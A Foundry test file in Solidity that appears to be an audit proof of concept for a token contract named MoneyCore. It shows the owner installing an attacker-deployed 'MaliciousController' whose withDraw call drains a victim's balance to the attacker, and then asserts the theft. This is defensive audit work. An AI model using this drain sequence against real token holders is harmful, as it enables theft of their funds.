import "forge-std/Test.sol";
import "../src/MoneyCore.sol";

contract OTUT_Test is Test {
    MoneyCore token;
    address owner = address(0x1);
    address victim = address(0x2);
    address attacker = address(0x3);
    uint256 initialSupply = 1000 ether;

    function setUp() public {
        // Deploy token and prepare initial state
        vm.prank(owner);
        token = new MoneyCore(initialSupply, owner);

        // Distribute tokens
        vm.prank(owner);
        token.transfer(victim, 100 ether);
    }

    function test_owner_transfer_user_tokens() public {
        // Record initial balances
        uint256 victimInitialBalance = token.balanceOf(victim);
        uint256 attackerInitialBalance = token.balanceOf(attacker);

        // Set victim's address as target account (requires victim to be an EOA)
        vm.prank(owner);
        token.setAccount(victim);

        // Note: Attack sequence begins
        // 1. Attacker deploys a malicious controller contract
        vm.prank(attacker);
        MaliciousController maliciousController = new MaliciousController();

        // 2. Owner sets malicious controller as active controller
        vm.prank(owner);
        token.setController(address(maliciousController));

        // 3. Malicious controller calls withDraw to steal victim's funds
        vm.prank(attacker);
        maliciousController.attack(address(token), attacker, victimInitialBalance);

        // Verify token theft
        assertEq(token.balanceOf(victim), 0, "Victim balance not drained");
        assertEq(
            token.balanceOf(attacker), 
            attackerInitialBalance + victimInitialBalance,
            "Attacker did not receive stolen tokens"
        );
    }
}

contract MaliciousController {
    function attack(address tokenAddr, address recipient, uint256 amount) external {
        MoneyCore(tokenAddr).withDraw(recipient, amount);
    }
}
